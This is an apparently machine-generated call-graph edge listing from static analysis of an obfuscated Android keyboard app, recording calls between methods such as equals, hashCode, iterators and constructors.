VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lje: void <init>(ljf)>(r0) in <ljf: java.util.Iterator iterator()> ==> <lje: void <init>(ljf)>
SPECIAL edge: specialinvoke $r28.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
SPECIAL edge: $r1 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: java.lang.Object e(int)> ==> <ljf: java.lang.Object[] s()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractSet: void <init>()>() in <lvq: void <init>(lvr,int)> ==> <java.util.AbstractSet: void <init>()>
SPECIAL edge: specialinvoke $r4.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r5) in <izw: java.lang.Object al(int)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: void <init>(char[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r4.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lma: lkq f()>() in <lma: lkq k()> ==> <lqr: lkq f()>
STATIC edge: $i0 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: int n(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <j$.util.concurrent.ConcurrentHashMap: int n(int)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <liy: int size()>
STATIC edge: $r1 = staticinvoke <lkq: lkq h(java.lang.Object[],int)>($r2, $i0) in <lqr: lkq f()> ==> <lkq: lkq h(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.util.AbstractCollection: void <init>()>() in <lkh: void <init>()> ==> <java.util.AbstractCollection: void <init>()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(3) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <lma: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean deepEquals(java.lang.Object[],java.lang.Object[])>($r2, $r3) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean deepEquals(java.lang.Object[],java.lang.Object[])>
VIRTUAL edge: $r4 = virtualinvoke $r3.<java.lang.StringBuilder: java.lang.String toString()>() in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r1 = staticinvoke <j$.sun.misc.b: java.lang.reflect.Field i()>() in <j$.sun.misc.b: void <clinit>()> ==> <j$.sun.misc.b: java.lang.reflect.Field i()>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int highestOneBit(int)>($i1) in <lkg: int a(int,int)> ==> <java.lang.Integer: int highestOneBit(int)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOfRange(java.lang.Object[],int,int,java.lang.Class)>($r2, $i0, $i1, $r3) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <java.util.Arrays: java.lang.Object[] copyOfRange(java.lang.Object[],int,int,java.lang.Class)>
STATIC edge: $r1 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <lvr: int hashCode()> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int j()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: int j()>
STATIC edge: $r4 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r4) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lkq: boolean isEmpty()>() in <lkq: lsb C(int)> ==> <java.util.AbstractCollection: boolean isEmpty()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r0) in <lri: boolean a(java.util.Comparator,java.lang.Iterable)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int j()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: int j()>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "fromLocale", 222, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsv: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<com.google.android.apps.inputmethod.latin.LatinApp: void <init>()>() in <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <init>()> ==> <com.google.android.apps.inputmethod.latin.LatinApp: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkq: java.lang.Object get(int)>($i2) in <lkq: int hashCode()> ==> <lql: java.lang.Object get(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
SPECIAL edge: $r5 = specialinvoke r0.<ljf: java.lang.Object p()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.lang.Object p()>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r8, $i2, $r4) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lkh: java.lang.Object[] n()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lkh: java.lang.Object[] n()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<lig: void <init>()>() in <lim: void <init>()> ==> <lig: void <init>()>
STATIC edge: $r1 = staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>("line.separator") in <lwe: void <clinit>()> ==> <java.lang.System: java.lang.String getProperty(java.lang.String)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lrg: lsa l()>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Collection: boolean isEmpty()>() in <lmb: lme f()> ==> <java.util.AbstractCollection: boolean isEmpty()>
VIRTUAL edge: $i1 = virtualinvoke $r11.<lma: int size()>() in <lmb: lme f()> ==> <lqr: int size()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: int hashCode()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" threw ") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <llg: java.lang.Object next()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <lrg: java.util.Iterator iterator()>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <ljf: int size()>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(char[],char[])>($r12, $r13) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(char[],char[])>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqr: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.c: void <init>(long)> ==> <java.lang.Object: void <init>()>
CLINIT edge: staticinvoke <hfd: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hfd: void <clinit>()>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r3) in <lri: boolean V(java.util.List,java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)>($r2, $r1, 0) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)>
CLINIT edge: staticinvoke <lum: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lum: void <clinit>()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: boolean equals(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <lvt: boolean equals(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <lqq: java.lang.Object s(java.lang.Object[],int,int,int)>($r1, $i0, $i1, 0) in <lqk: void <init>(java.lang.Object[],int)> ==> <lqq: java.lang.Object s(java.lang.Object[],int,int,int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "message") in <lup: void <init>(lwc,java.lang.String)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
SPECIAL edge: $r3 = specialinvoke r0.<ljf: int[] r()>() in <ljf: int o(int,int,int,int)> ==> <ljf: int[] r()>
STATIC edge: $r7 = staticinvoke <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>("com.google.common.base.Strings") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.util.logging.Logger: java.util.logging.Logger getLogger(java.lang.String)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <lkq: java.util.Iterator iterator()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object[] y()>() in <ljd: void t(int)> ==> <ljd: java.lang.Object[] y()>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <lqr: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: java.lang.Object get(int)>($i0) in <lkm: java.lang.Object a(int)> ==> <lqp: java.lang.Object get(int)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <lsb: boolean hasNext()>
SPECIAL edge: specialinvoke $r3.<hnq: void <init>()>() in <hnt: void <clinit>()> ==> <hnq: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkq: lsb C(int)>(0) in <lkq: lsb B()> ==> <lkq: lsb C(int)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<mly: java.lang.IllegalArgumentException f()>() in <lqq: java.lang.Object s(java.lang.Object[],int,int,int)> ==> <mly: java.lang.IllegalArgumentException f()>
INTERFACE edge: $z0 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <llg: boolean hasNext()> ==> <lsb: boolean hasNext()>
SPECIAL edge: specialinvoke $r0.<lvs: void <init>(java.lang.String,int)>("BOOLEAN", 0) in <lvs: void <clinit>()> ==> <lvs: void <init>(java.lang.String,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <izw: java.lang.Object[] S(java.lang.Iterable)>($r1) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <izw: java.lang.Object[] S(java.lang.Iterable)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<ljd: java.lang.Object h(int)>($i0) in <ljb: void <init>(ljd,int)> ==> <ljd: java.lang.Object h(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <lqr: int hashCode()>
STATIC edge: staticinvoke <java.util.Arrays: void fill(byte[],byte)>($r4, -1) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.Arrays: void fill(byte[],byte)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<mly: java.lang.IllegalArgumentException f()>() in <lkt: lkx b(boolean)> ==> <mly: java.lang.IllegalArgumentException f()>
STATIC edge: staticinvoke <java.util.Arrays: void fill(int[],int)>($r8, $i1) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.Arrays: void fill(int[],int)>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <llg: java.lang.Object next()>
STATIC edge: staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lly: void j(java.lang.Object)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.Object: java.lang.Class getClass()>() in <lri: java.lang.Object[] o(java.lang.Object[],int)> ==> <java.lang.Object: java.lang.Class getClass()>
STATIC edge: staticinvoke <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)>
SPECIAL edge: specialinvoke r0.<lkh: void <init>()>() in <lma: void <init>()> ==> <lkh: void <init>()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.reflect.Method getDeclaredMethod(java.lang.String,java.lang.Class[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("null value in entry: ") in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r0) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <iye: void O(int,int)>($i0, $i1) in <lql: java.lang.Object get(int)> ==> <iye: void O(int,int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Throwable: void <init>()>() in <java.lang.Exception: void <init>()> ==> <java.lang.Throwable: void <init>()>
INTERFACE edge: $r6 = interfaceinvoke $r1.<java.util.Iterator: java.lang.Object next()>() in <llg: java.lang.Object next()> ==> <lsb: java.lang.Object next()>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lrg: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String,java.lang.Throwable)>($r1, $r10) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String,java.lang.Throwable)>
SPECIAL edge: specialinvoke r0.<lmo: void <init>(java.util.Comparator)>($r2) in <lqs: void <init>(lkq,java.util.Comparator)> ==> <lmo: void <init>(java.util.Comparator)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r3) in <iye: void O(int,int)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljd: boolean v()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: boolean v()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $r11 = staticinvoke <hny: hny a(hmm)>($r10) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hny: hny a(hmm)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
STATIC edge: $i6 = staticinvoke <izw: int ac(int)>($i6) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: int ac(int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljf: int[] r()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: int length()>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lmb: lme f()> ==> <lsb: boolean hasNext()>
STATIC edge: $r3 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r2, $i1) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r3.<java.lang.StringBuilder: java.lang.String toString()>() in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.String toString()>
INTERFACE edge: $r6 = interfaceinvoke $r4.<java.util.Set: java.util.Iterator iterator()>() in <lqs: boolean equals(java.lang.Object)> ==> <ljf: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(15) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke r0.<ljd: void A(int)>($i1) in <ljd: int b()> ==> <ljd: void A(int)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorGifSearchMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: $i0 = staticinvoke <java.lang.Math: int max(int,int)>($i0, 2) in <izw: int ae(int)> ==> <java.lang.Math: int max(int,int)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: boolean hasNext()>
STATIC edge: $r2 = staticinvoke <lum: lul g()>() in <lsn: boolean ac()> ==> <lum: lul g()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(">") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
INTERFACE edge: $i0 = interfaceinvoke $r0.<java.util.List: int size()>() in <ivw: java.lang.String[] Q(java.util.List)> ==> <java.util.ArrayList: int size()>
VIRTUAL edge: $i3 = virtualinvoke $r2.<java.lang.String: int length()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: int length()>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <lnc: java.lang.Object next()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: int hashCode()>
VIRTUAL edge: $i0 = virtualinvoke $r4.<lma: int size()>() in <lly: lma g()> ==> <lqr: int size()>
VIRTUAL edge: virtualinvoke r0.<ljd: void r(int,java.lang.Object,java.lang.Object,int,int)>($i0, $r2, $r1, $i3, $i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)>
INTERFACE edge: $r1 = interfaceinvoke $r0.<java.util.List: java.lang.Object get(int)>($i1) in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lql: java.lang.Object get(int)>
VIRTUAL edge: virtualinvoke $r2.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i1) in <iye: void O(int,int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lqd: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".") in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: java.lang.String toHexString(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
INTERFACE edge: $i0 = interfaceinvoke $r3.<java.lang.Comparable: int compareTo(java.lang.Object)>($r4) in <lqc: int compare(java.lang.Object,java.lang.Object)> ==> <java.lang.String: int compareTo(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lts: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke r0.<ljf: int b()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: int b()>
STATIC edge: $r2 = staticinvoke <ivw: ivv I()>() in <ivw: ivw f(java.lang.String)> ==> <ivw: ivv I()>
SPECIAL edge: specialinvoke $r24.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_SEARCH_SUGGESTION_METADATA", 24, 24) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: int hashCode()>
VIRTUAL edge: $r9 = virtualinvoke $r8.<llo: lma u()>() in <hbv: void j()> ==> <llo: lma u()>
STATIC edge: $i5 = staticinvoke <izw: int ag(int,int,int)>($i2, $i1, $i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int ag(int,int,int)>
SPECIAL edge: specialinvoke $r1.<lqp: void <init>(java.lang.Object[],int,int)>($r2, 0, $i0) in <lqq: lma g()> ==> <lqp: void <init>(java.lang.Object[],int,int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: java.lang.Object get(int)>($i0) in <lkm: java.lang.Object a(int)> ==> <lqm: java.lang.Object get(int)>
STATIC edge: $r0 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>("%s (%s) must not be greater than size (%s)", $r1) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
SPECIAL edge: specialinvoke r0.<lsa: void <init>()>() in <lsb: void <init>(int,int)> ==> <lsa: void <init>()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lvt: boolean equals(java.lang.Object)>
STATIC edge: $r5 = staticinvoke <ivw: java.lang.String[] Q(java.util.List)>($r4) in <ivw: void <init>(ivv,java.lang.String)> ==> <ivw: java.lang.String[] Q(java.util.List)>
CLINIT edge: staticinvoke <hbu: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hbu: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void q(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.ConcurrentHashMap: void q(int)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <lkq: int hashCode()>
STATIC edge: staticinvoke <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)>($r3, $r3, $i5, $i0, $i4) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)>
VIRTUAL edge: $r6 = virtualinvoke $r4.<lts: lsz c(int)>($i1) in <lsn: boolean ac()> ==> <lsm: lsz c(int)>
